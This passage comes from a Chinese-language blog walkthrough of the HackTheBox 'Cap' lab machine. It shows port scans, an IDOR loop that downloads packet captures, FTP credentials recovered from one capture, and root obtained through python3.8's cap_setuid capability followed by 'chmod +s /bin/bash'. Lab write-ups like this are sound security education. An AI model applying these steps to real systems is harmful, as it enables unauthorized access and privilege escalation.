p) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 0.81 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Cap nmap -sT -A -p 21,22,80 10.10.10.245                        \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 12:24 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.10.245\nHost is up (0.12s latency).\n\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)\n|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)\n|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)\n80/tcp open  http    Gunicorn\n|_http-title: Security Dashboard\n|_http-server-header: gunicorn\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nNetwork Distance: 2 hops\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   110.57 ms 10.10.16.1\n2   55.69 ms  10.10.10.245\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 15.50 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e有\u003ccode\u003eFTP\u003c/code\u003e服务的存在，我们首先枚举\u003ccode\u003eFTP\u003c/code\u003e ，但是并不支持匿名用户访问\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Cap ftp 10.10.10.245\nConnected to 10.10.10.245.\n220 (vsFTPd 3.0.3)\nName (10.10.10.245:root): anonymous\n331 Please specify the password.\nPassword: \n530 Login incorrect.\nftp: Login failed\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问 \u003ccode\u003eHTTP\u003c/code\u003e ，一个后台管理的模板\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Cap/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e有一些很有趣的功能\u003c/p\u003e\n\u003cp\u003e在 \u003ccode\u003e/data/3\u003c/code\u003e 中能下载一个 \u003ccode\u003epcap\u003c/code\u003e文件\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e/ip\u003c/code\u003e 能看到\u003ccode\u003eip add\u003c/code\u003e 命令执行的结果\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Cap/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e/netstat\u003c/code\u003e 中能发现端口和进程信息\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Cap/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e发现了一个有趣的点 \u003ccode\u003e/data/x\u003c/code\u003e 是会增加的，能观察到最大是到\u003ccode\u003e9\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Cap/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eIDOR - 不安全的直接对象引用\u003c/h2\u003e\n\u003cp\u003e下载的\u003ccode\u003epcap\u003c/code\u003e文件貌似是一段时间内通过的流量，我们一直\u003ccode\u003eping\u003c/code\u003e ，等待它更新，更新后我们将\u003ccode\u003epcap\u003c/code\u003e文件下载下来打开，能确定就是它捕获的流量\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Cap/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可以尝试一直下载 \u003ccode\u003epcap\u003c/code\u003e 文件，捕捉下载时的流量\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Cap \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e i \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e {0..9};\u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e curl 10.10.10.245/download/\u003cspan class=\"hljs-variable\"\u003e${i}\u003c/span\u003e --output \u003cspan class=\"hljs-variable\"\u003e${i}\u003c/span\u003e.pcap;\u003cspan class=\"hljs-built_in\"\u003esleep\u003c/span\u003e 1;\u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Cap/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e当我们分析到\u003ccode\u003e0.pcap\u003c/code\u003e文件的时候，能发现捕捉到了\u003ccode\u003eFTP\u003c/code\u003e的包，这在其他\u003ccode\u003e\u003e1.pacp\u003c/code\u003e的数据包中是没有的\u003c/p\u003e\n\u003cp\u003e所以这里出现了应用逻辑上的错误，敏感信息泄露 (Sensitive Information Disclosure)，不安全的直接对象引用 (Insecure Direct Object Reference - IDOR)\u003c/p\u003e\n\u003cp\u003e并且后端代码中可能是：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edef download_file(i):\n    \u003cspan class=\"hljs-comment\"\u003e# 当 i=0 时，有一个特殊处理，可能用于调试或测试\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e i == 0:\n        file_path = \u003cspan class=\"hljs-string\"\u003e\"/var/log/debug/ftp_capture.pcap\"\u003c/span\u003e \u003cspan class=\"hljs-comment\"\u003e# 指向了一个开发/运维人员留下的调试文件\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n        \u003cspan class=\"hljs-comment\"\u003e# 正常逻辑\u003c/span\u003e\n        file_path = f\u003cspan class=\"hljs-string\"\u003e\"/var/www/downloads/file_{i}.data\"\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e# 检查文件是否存在并返回给用户\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e file_exists(file_path):\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e send_file(file_path)\n    \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"File not found\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后我们得到了它\u003c/p\u003e\n\u003cp\u003e并且\u003ccode\u003eFTP\u003c/code\u003e数据包中带有\u003ccode\u003enathan\u003c/code\u003e用户的凭据，\u003ccode\u003enathan:Buck3tH4TF0RM3!\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Cap/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e凭据可以进去到 \u003ccode\u003eFTP\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Cap ftp 10.10.10.245                                                                  \nConnected to 10.10.10.245.\n220 (vsFTPd 3.0.3)\nName (10.10.10.245:root): nathan\n331 Please specify the password.\nPassword: \n230 Login successful.\nRemote system \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e is UNIX.\nUsing binary mode to transfer files.\nftp\u003e \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e\n229 Entering Extended Passive Mode (|||24592|)\n150 Here comes the directory listing.\n-rw-rw-r--    1 1001     1001          408 Jun 11 04:18 index.html\ndrwxr-xr-x    3 1001     1001         4096 Jun 11 04:28 snap\n-r--------    1 1001     1001           33 Jun 10 19:39 user.txt\n226 Directory send OK.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e也可以进行 \u003ccode\u003eSSH\u003c/code\u003e 登录\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Cap/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e当前家目录下可以读取\u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003enathan@\u003cspan class=\"hljs-built_in\"\u003ecap\u003c/span\u003e:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt \nc5a3b7e60be43d07acb3580714228ee7\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e权限提升\u003c/h2\u003e\n\u003cp\u003e运行\u003ccode\u003eWeb\u003c/code\u003e的\u003ccode\u003eapp.py\u003c/code\u003e 里面的信息很有趣，\u003ccode\u003esetuid(0)\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Cap/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是我们可以注意到是以\u003ccode\u003enathan\u003c/code\u003e权限运行的，那么\u003ccode\u003esetuid(0)\u003c/code\u003e 要怎么才能有效呢？\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003enathan@\u003cspan class=\"hljs-built_in\"\u003ecap\u003c/span\u003e:/var/www/html$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al\ntotal 32\ndrwxr-xr-x 6 nathan nathan 4096 Jun 11 09:47 .\ndrwxr-xr-x 3 root   root   4096 May 23  2021 ..\ndrwxr-xr-x 2 nathan nathan 4096 May 27  2021 __pycache__\n-rw-r--r-- 1 nathan nathan 4267 Jun 11 09:43 app.py\ndrwxr-xr-x 6 root   root   4096 May 23  2021 static\ndrwxr-xr-x 2 root   root   4096 May 23  2021 templates\ndrwxr-xr-x 2 root   root   4096 Jun 11 09:42 upload\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们直接运行\u003ccode\u003epython\u003c/code\u003e ，直接就能拿到 \u003ccode\u003eroot\u003c/code\u003e 权限了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003enathan@\u003cspan class=\"hljs-built_in\"\u003ecap\u003c/span\u003e:/var/www/html$ python3\npython3           python3-config    python3.8         python3.8-config  \nnathan@\u003cspan class=\"hljs-built_in\"\u003ecap\u003c/span\u003e:/var/www/html$ python3.8\nPython 3.8.5 (default, Jan 27 2021, 15:41:15) \n[GCC 9.3.0] on linux\nType \u003cspan class=\"hljs-string\"\u003e\"help\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"copyright\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"credits\"\u003c/span\u003e or \u003cspan class=\"hljs-string\"\u003e\"license\"\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e more information.\n\u003e\u003e\u003e import os;os.setuid(0)\n\u003e\u003e\u003e os.system(\u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e)\nTraceback (most recent call last):\n  File \u003cspan class=\"hljs-string\"\u003e\"\u0026#x3C;stdin\u003e\"\u003c/span\u003e, line 1, \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u0026#x3C;module\u003e\nTypeError: expected str, bytes or os.PathLike object, not builtin_function_or_method\n\u003e\u003e\u003e os.system(\u003cspan class=\"hljs-string\"\u003e'id'\u003c/span\u003e)\nuid=0(root) gid=1001(nathan) \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e=1001(nathan)\n0\n\u003e\u003e\u003e os.system(\u003cspan class=\"hljs-string\"\u003e'chmod +s /bin/bash'\u003c/span\u003e)\n0\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ebash-5.0# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e root.txt \n6b21801e0d9e7354cfa2de802cf89dcd\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过 \u003ccode\u003egetcap\u003c/code\u003e 命令也能知道为什么会有该权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003enathan@\u003cspan class=\"hljs-built_in\"\u003ecap\u003c/span\u003e:/var/www/html$ \u003cspan class=\"hljs-built_in\"\u003ewhich\u003c/span\u003e python3\n/usr/bin/python3\nnathan@\u003cspan class=\"hljs-built_in\"\u003ecap\u003c/span\u003e:/var/www/html$ \u003cspan class=\"hljs-built_in\"\u003ewhich\u003c/span\u003e python3.8\n/usr/bin/python3.8\nnathan@\u003cspan class=\"hljs-built_in\"\u003ecap\u003c/span\u003e:/var/www/html$ \u003cspan class=\"hljs-built_in\"\u003egetcap\u003c/span\u003e /usr/bin/python3\nnathan@\u003cspan class=\"hljs-built_in\"\u003ecap\u003c/span\u003e:/var/www/html$ \u003cspan class=\"hljs-built_in\"\u003egetcap\u003c/span\u003e /usr/bin/python3.8\n/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip\n\u003c/code\u003e\u003c/pre\u003e","title":"HackTheBox - Machine - Cap","date":"2025-06-11","updated":"2025-06-11","tags":["HackTheBox","Linux","Capabilities","IDOR"],"categories":"靶机","comments":true,"description":"Machine Cap https://app.hackthebox.com/machines/Cap | Linux | Easy 大名鼎鼎的Cap，新手关 Recon nmap端口扫描 有FTP服务的存在，我们首先枚举FTP ，但是并不支持匿名用户访问 访问 HTTP ，一个后台管理的模板 有一..."},"recentPosts":[{"id":"Machinevictorique","title":"Machine - victorique","date":"2025-12-13","isEncryp
